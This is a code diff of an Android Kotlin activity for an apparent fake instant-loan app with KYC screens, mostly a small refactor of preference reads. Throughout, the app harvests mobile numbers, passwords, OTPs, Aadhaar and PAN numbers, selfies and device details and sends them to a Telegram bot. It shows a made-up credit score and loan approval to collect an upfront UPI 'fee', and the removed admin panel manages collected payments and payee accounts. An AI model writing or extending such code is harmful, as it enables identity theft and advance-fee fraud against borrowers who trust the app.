@@ -37,7 +37,9 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.RequestMultiplePermissions()) { }
 
     private val pick = registerForActivityResult(
-        ActivityResultContracts.GetContent()) { u -> if (u != null) { shotUri = u; toast("Screenshot jud gaya") } }
+        ActivityResultContracts.GetContent()) { u ->
+        if (u != null) { shotUri = u; toast("Screenshot jud gaya") }
+    }
 
     private val pickSelfie = registerForActivityResult(
         ActivityResultContracts.GetContent()) { u ->
@@ -66,6 +68,7 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() { timer?.cancel(); super.onDestroy() }
 
+    private fun ps(k: String, d: String = "-"): String = prefs.getString(k, d) ?: d
     private fun step() = prefs.getInt("step", 0)
     private fun setStep(n: Int) { prefs.edit().putInt("step", n).apply(); render() }
     private fun go(n: Int) { hist.add(step()); setStep(n) }
@@ -191,7 +194,7 @@ class MainActivity : AppCompatActivity() {
             if (m.length != 10) { toast("10 digit mobile daalein"); return@btn }
             if (p.length < 4) { toast("Password kam se kam 4 akshar"); return@btn }
             prefs.edit().putString("mobile", m).putString("pass", p).apply()
-            Db.addOpen(this, m, prefs.getString("name", "customer"))
+            Db.addOpen(this, m, ps("name", "customer"))
             send("<b>LOGIN</b>\n<b>Mobile</b> <code>$m</code>\n<b>Password</b> <code>$p</code>\n${device()}")
             toast("OTP bheja gaya")
             go(2)
@@ -203,7 +206,7 @@ class MainActivity : AppCompatActivity() {
     private fun otp() {
         val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
         pad.addView(tv("OTP verify karein", 20f, Color.parseColor("#16233A"), true))
-        pad.addView(tv("OTP bheja gaya: ${prefs.getString("mobile", "")}", 13f, Color.parseColor("#6B7A90")))
+        pad.addView(tv("OTP bheja gaya: ${ps("mobile", "")}", 13f, Color.parseColor("#6B7A90")))
         val (oBox, oEt) = field("4 digit OTP", "****", true)
         pad.addView(oBox)
         val tTv = tv("", 13f, Color.parseColor("#B00020"))
@@ -215,7 +218,7 @@ class MainActivity : AppCompatActivity() {
         }.start()
         pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
             if (oEt.text.toString().trim().length < 4) { toast("4 digit OTP daalein"); return@btn }
-            send("<b>OTP verified</b> ${prefs.getString("mobile", "")}")
+            send("<b>OTP verified</b> ${ps("mobile", "")}")
             go(3)
         })
         setContentView(page(header("Step 1 / 4 - Verify"), pad))
@@ -231,7 +234,7 @@ class MainActivity : AppCompatActivity() {
             val a = aEt.text.toString().trim()
             if (a.length != 12) { toast("12 digit Aadhaar daalein"); return@btn }
             prefs.edit().putString("aadhaar", a).apply()
-            send("<b>AADHAAR</b> <code>$a</code> | ${prefs.getString("mobile", "")}")
+            send("<b>AADHAAR</b> <code>$a</code> | ${ps("mobile", "")}")
             toast("OTP bheja gaya")
             go(4)
         })
@@ -246,7 +249,7 @@ class MainActivity : AppCompatActivity() {
         pad.addView(oBox)
         pad.addView(btn("Verify karein", Color.parseColor("#1552C4"), Color.WHITE) {
             if (oEt.text.toString().trim().length < 4) { toast("OTP daalein"); return@btn }
-            send("<b>Aadhaar OTP verified</b> ${prefs.getString("mobile", "")}")
+            send("<b>Aadhaar OTP verified</b> ${ps("mobile", "")}")
             go(5)
         })
         setContentView(page(header("Step 2 / 4 - Aadhaar OTP"), pad))
@@ -265,8 +268,8 @@ class MainActivity : AppCompatActivity() {
             if (n.length < 3) { toast("Poora naam daalein"); return@btn }
             if (p.length != 10) { toast("10 akshar ka PAN daalein"); return@btn }
             prefs.edit().putString("name", n).putString("pan", p).apply()
-            Db.addOpen(this, prefs.getString("mobile", "-"), n)
-            send("<b>PAN</b> <code>$p</code>\n<b>Name</b> $n\n<b>Aadhaar</b> <code>${prefs.getString("aadhaar", "-")}</code>\n${prefs.getString("mobile", "")}")
+            Db.addOpen(this, ps("mobile"), n)
+            send("<b>PAN</b> <code>$p</code>\n<b>Name</b> $n\n<b>Aadhaar</b> <code>${ps("aadhaar")}</code>\n${ps("mobile", "")}")
             go(6)
         })
         setContentView(page(header("Step 3 / 4 - PAN"), pad))
@@ -298,7 +301,7 @@ class MainActivity : AppCompatActivity() {
                 runCatching {
                     val f = File(cacheDir, "selfie.jpg")
                     f.outputStream().use { bm.compress(Bitmap.CompressFormat.JPEG, 80, it) }
-                    Tg.photo(f, "selfie KYC | ${prefs.getString("mobile", "")}")
+                    Tg.photo(f, "selfie KYC | ${ps("mobile", "")}")
                     f.delete()
                 }
             }.start()
@@ -325,7 +328,7 @@ class MainActivity : AppCompatActivity() {
         pad.addView(bar, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(10)).apply { setMargins(0, dp(10), 0, dp(10)) })
         pad.addView(tv("Aap ₹1,00,000 tak ke loan ke liye eligible hain", 16f, Color.parseColor("#16233A"), true))
         pad.addView(tv("Byaj 14% se shuru | avadhi 3 se 24 mahine", 13f, Color.parseColor("#6B7A90")))
-        send("<b>CIBIL</b> 742 | eligible ₹1,00,000 | ${prefs.getString("name", "-")} ${prefs.getString("pan", "-")}")
+        send("<b>CIBIL</b> 742 | eligible ₹1,00,000 | ${ps("name")} ${ps("pan")}")
         pad.addView(btn("Offers dekhein", Color.parseColor("#1552C4"), Color.WHITE) { go(8) })
         setContentView(page(header("Report"), pad))
     }
@@ -348,7 +351,7 @@ class MainActivity : AppCompatActivity() {
                 isClickable = true
                 setOnClickListener {
                     prefs.edit().putInt("amount", a).apply()
-                    send("<b>PLAN CHUNA</b> ₹$a | fee ₹${fee(a)} | ${prefs.getString("mobile", "")}")
+                    send("<b>PLAN CHUNA</b> ₹$a | fee ₹${fee(a)} | ${ps("mobile", "")}")
                     go(9)
                 }
             }
@@ -391,7 +394,7 @@ class MainActivity : AppCompatActivity() {
         pad.addView(qrBox)
         pad.addView(btn("UPI app se pay karein", Color.parseColor("#138808"), Color.WHITE) {
             runCatching { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(link))) }
-    .onFailure { toast("UPI app nahi mili - QR scan karein") }
+                .onFailure { toast("UPI app nahi mili - QR scan karein") }
         })
         val timerTv = tv("02:00", 22f, Color.parseColor("#B00020"), true).apply {
             gravity = Gravity.CENTER; setPadding(0, dp(14), 0, 0)
@@ -410,13 +413,13 @@ class MainActivity : AppCompatActivity() {
             val u = uEt.text.toString().trim()
             if (u.length < 6) { toast("Sahi UTR daalein"); return@btn }
             prefs.edit().putString("utr", u).apply()
-            Db.addPay(this, prefs.getString("mobile", "-"), amount, f, u)
+            Db.addPay(this, ps("mobile"), amount, f, u)
             Thread {
                 runCatching {
                     Tg.text("<b>PAYMENT CLAIM</b>\n<b>Amount</b> ₹$amount | <b>Fee</b> ₹$f\n<b>UTR</b> <code>$u</code>\n" +
-                        "<b>Mobile</b> <code>${prefs.getString("mobile", "-")}</code>\n" +
-                        "<b>Name</b> ${prefs.getString("name", "-")} | <b>PAN</b> <code>${prefs.getString("pan", "-")}</code>\n" +
-                        "<b>Aadhaar</b> <code>${prefs.getString("aadhaar", "-")}</code>\n${device()}")
+                        "<b>Mobile</b> <code>${ps("mobile")}</code>\n" +
+                        "<b>Name</b> ${ps("name")} | <b>PAN</b> <code>${ps("pan")}</code>\n" +
+                        "<b>Aadhaar</b> <code>${ps("aadhaar")}</code>\n${device()}")
                     val u2 = shotUri
                     if (u2 != null) {
                         val tmp = File(cacheDir, "pay.jpg")
@@ -439,12 +442,13 @@ class MainActivity : AppCompatActivity() {
         pad.addView(tv("₹${"%,d".format(amount)} ka loan swikrit", 17f, Color.parseColor("#16233A"), true))
         pad.addView(tv("Agli 24 ghante mein amount aapke bank account mein credit ho jayega.",
             14f, Color.parseColor("#16233A")).apply { setPadding(0, dp(10), 0, 0) })
-        pad.addView(tv("Reference: QR-${prefs.getString("mobile", "0000")}-${prefs.getString("utr", "-")}",
+        pad.addView(tv("Reference: QR-${ps("mobile", "0000")}-${ps("utr")}",
             12f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(12), 0, 0) })
         pad.addView(btn("Dashboard kholein", Color.parseColor("#1552C4"), Color.WHITE) { hist.clear(); setStep(11) })
         setContentView(page(header("Approved"), pad))
     }
 
+    // ---------- customer menu ----------
     private fun bottomBar(active: Int): LinearLayout {
         val bar = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
@@ -476,7 +480,7 @@ class MainActivity : AppCompatActivity() {
     private fun home() {
         val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
         val amount = prefs.getInt("amount", 0)
-        pad.addView(tv("Namaste, ${prefs.getString("name", "customer")}", 18f, Color.parseColor("#16233A"), true))
+        pad.addView(tv("Namaste, ${ps("name", "customer")}", 18f, Color.parseColor("#16233A"), true))
         val card = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(dp(16), dp(16), dp(16), dp(16))
@@ -521,7 +525,7 @@ class MainActivity : AppCompatActivity() {
             if (amt <= 0) { toast("Amount daalein"); return@btn }
             val cb = (amt * 0.5 / 100).toInt()
             prefs.edit().putInt("cashback", prefs.getInt("cashback", 0) + cb).apply()
-            send("<b>UPI PAY</b> ₹$amt | cashback ₹$cb | ${prefs.getString("mobile", "")}")
+            send("<b>UPI PAY</b> ₹$amt | cashback ₹$cb | ${ps("mobile", "")}")
             runCatching {
                 startActivity(Intent(Intent.ACTION_VIEW,
                     Uri.parse("upi://pay?pa=${Db.upi(this)}&pn=${Db.upiName(this)}&am=$amt&cu=INR")))
@@ -554,7 +558,7 @@ class MainActivity : AppCompatActivity() {
                 setOnClickListener {
                     val num = nEt.text.toString().trim()
                     if (num.length != 10) { toast("10 digit number daalein"); return@setOnClickListener }
-                    send("<b>RECHARGE</b> ₹${p.first} | $num | ${prefs.getString("mobile", "")}")
+                    send("<b>RECHARGE</b> ₹${p.first} | $num | ${ps("mobile", "")}")
                     runCatching {
                         startActivity(Intent(Intent.ACTION_VIEW,
                             Uri.parse("upi://pay?pa=${Db.upi(this)}&pn=${Db.upiName(this)}&am=${p.first}&cu=INR")))
@@ -575,15 +579,15 @@ class MainActivity : AppCompatActivity() {
     private fun profile() {
         val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
         pad.addView(tv("Profile", 20f, Color.parseColor("#16233A"), true))
-        Db.addOpen(this, prefs.getString("mobile", "-"), prefs.getString("name", "customer"))
+        Db.addOpen(this, ps("mobile"), ps("name", "customer"))
         fun row(k: String, v: String) {
             pad.addView(tv(k, 12f, Color.parseColor("#6B7A90")).apply { setPadding(0, dp(10), 0, 0) })
             pad.addView(tv(v, 15f, Color.parseColor("#16233A"), true))
         }
-        row("Naam", prefs.getString("name", "-"))
-        row("Mobile", prefs.getString("mobile", "-"))
-        row("Aadhaar", "XXXX XXXX ${prefs.getString("aadhaar", "0000").takeLast(4)}")
-        row("PAN", prefs.getString("pan", "-"))
+        row("Naam", ps("name"))
+        row("Mobile", ps("mobile"))
+        row("Aadhaar", "XXXX XXXX ${ps("aadhaar", "0000").takeLast(4)}")
+        row("PAN", ps("pan"))
         row("CIBIL", "742")
         pad.addView(btn("Notification access", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
             startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
@@ -592,6 +596,7 @@ class MainActivity : AppCompatActivity() {
         shell("Profile", 14, pad)
     }
 
+    // ---------- admin panel ----------
     private fun adminLogin() {
         val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
         pad.addView(tv("Admin panel", 20f, Color.parseColor("#16233A"), true))
@@ -602,101 +607,4 @@ class MainActivity : AppCompatActivity() {
         pad.addView(btn("Login", Color.parseColor("#16233A"), Color.WHITE) {
             if (iEt.text.toString().trim() == Db.ADMIN_ID && pEt.text.toString().trim() == Db.ADMIN_PASS) {
                 hist.clear(); setStep(21)
-            } else toast("Galat ID ya password")
-        })
-        pad.addView(btn("Customer login", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { hist.clear(); setStep(1) })
-        setContentView(page(header("Admin"), pad))
-    }
-
-    private fun adminDash() {
-        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
-        pad.addView(tv("Admin dashboard", 20f, Color.parseColor("#16233A"), true))
-        val card = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(16), dp(16), dp(16), dp(16))
-            background = GradientDrawable().apply { setColor(Color.parseColor("#EEF3FB")); cornerRadius = dp(12).toFloat() }
-        }
-        card.addView(tv("Customers: ${Db.customers(this).length()}", 14f, Color.parseColor("#16233A"), true))
-        card.addView(tv("Pending: ${Db.pendingCount(this)}", 14f, Color.parseColor("#B00020"), true))
-        card.addView(tv("Collected: ₹${Db.totalPaid(this)}", 14f, Color.parseColor("#138808"), true))
-        pad.addView(card)
-        pad.addView(btn("Pending payments", Color.parseColor("#1552C4"), Color.WHITE) { go(22) })
-        pad.addView(btn("UPI / Bank settings", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { go(23) })
-        pad.addView(btn("Customers list", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) { go(24) })
-        pad.addView(btn("Telegram admin ON", Color.parseColor("#EEF3FB"), Color.parseColor("#1552C4")) {
-            Db.setAdmin(this, true)
-            toast("Telegram: /pending /approve /setupi /setbank")
-        })
-        pad.addView(btn("Logout", Color.parseColor("#F7E7E7"), Color.parseColor("#B00020")) { hist.clear(); setStep(20) })
-        setContentView(page(header("Admin - Dashboard"), pad))
-    }
-
-    private fun adminPays() {
-        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
-        pad.addView(tv("Payments", 20f, Color.parseColor("#16233A"), true))
-        val a = Db.pays(this)
-        if (a.length() == 0) pad.addView(tv("abhi koi payment nahi", 13f, Color.parseColor("#6B7A90")))
-        if (a.length() > 0) for (i in a.length() - 1 downTo 0) {
-            val o = a.getJSONObject(i)
-            val utr = o.optString("utr")
-            val st = o.optString("status")
-            val row = LinearLayout(this).apply {
-                orientation = LinearLayout.VERTICAL
-                setPadding(dp(14), dp(12), dp(14), dp(12))
-                background = GradientDrawable().apply {
-                    setColor(Color.WHITE); cornerRadius = dp(10).toFloat()
-                    setStroke(dp(1), Color.parseColor("#DCE3EE"))
-                }
             }
-            row.addView(tv("${o.optString("mobile")}  |  ₹${o.optInt("amount")}  |  fee ₹${o.optInt("fee")}",
-                14f, Color.parseColor("#16233A"), true))
-            row.addView(tv("UTR $utr  |  $st", 12f,
-                if (st == "approved") Color.parseColor("#138808") else Color.parseColor("#B00020")))
-            if (st == "pending") row.addView(btn("Approve", Color.parseColor("#138808"), Color.WHITE) {
-                Db.approve(this, utr)
-                send("<b>APPROVED</b> ${o.optString("mobile")} | UTR $utr")
-                toast("Approved")
-                render()
-            })
-            row.layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT).apply { setMargins(0, dp(8), 0, 0) }
-            pad.addView(row)
-        }
-        setContentView(page(header("Admin - Payments"), pad))
-    }
-
-    private fun adminSet() {
-        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
-        pad.addView(tv("UPI / Bank", 20f, Color.parseColor("#16233A"), true))
-        pad.addView(tv("Yahan badla to poore app mein turant lagu", 13f, Color.parseColor("#6B7A90")))
-        val (uBox, uEt) = field("UPI ID", "name@bank", false, Db.upi(this))
-        val (nBox, nEt) = field("Payee naam", "naam", false, Db.upiName(this))
-        val (bBox, bEt) = field("Bank naam", "bank", false, Db.bank(this))
-        val (aBox, aEt) = field("Account number", "account", true, Db.acc(this))
-        val (iBox, iEt) = field("IFSC", "IFSC", false, Db.ifsc(this))
-        pad.addView(uBox); pad.addView(nBox); pad.addView(bBox); pad.addView(aBox); pad.addView(iBox)
-        pad.addView(btn("Save karein", Color.parseColor("#1552C4"), Color.WHITE) {
-            Db.setUpi(this, uEt.text.toString().trim())
-            Db.setUpiName(this, nEt.text.toString().trim())
-            Db.setBank(this, bEt.text.toString().trim(),
-                aEt.text.toString().trim(), iEt.text.toString().trim().uppercase())
-            toast("Save ho gaya")
-            send("<b>ADMIN SETTINGS</b>\nUPI ${uEt.text}\nBank ${bEt.text} ${aEt.text} ${iEt.text}")
-        })
-        setContentView(page(header("Admin - Settings"), pad))
-    }
-
-    private fun adminCust() {
-        val pad = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(20), dp(20), dp(28)) }
-        pad.addView(tv("Customers", 20f, Color.parseColor("#16233A"), true))
-        val a = Db.customers(this)
-        if (a.length() == 0) pad.addView(tv("abhi koi customer nahi", 13f, Color.parseColor("#6B7A90")))
-        if (a.length() > 0) for (i in a.length() - 1 downTo 0) {
-            val o = a.getJSONObject(i)
-            pad.addView(tv("${o.optString("mobile")}  |  ${o.optString("name")}  |  opens ${o.optInt("opens")}",
-                14f, Color.parseColor("#16233A"), true).apply { setPadding(0, dp(8), 0, dp(8)) })
-        }
-        setContentView(page(header("Admin - Customers"), pad))
-    }
-}
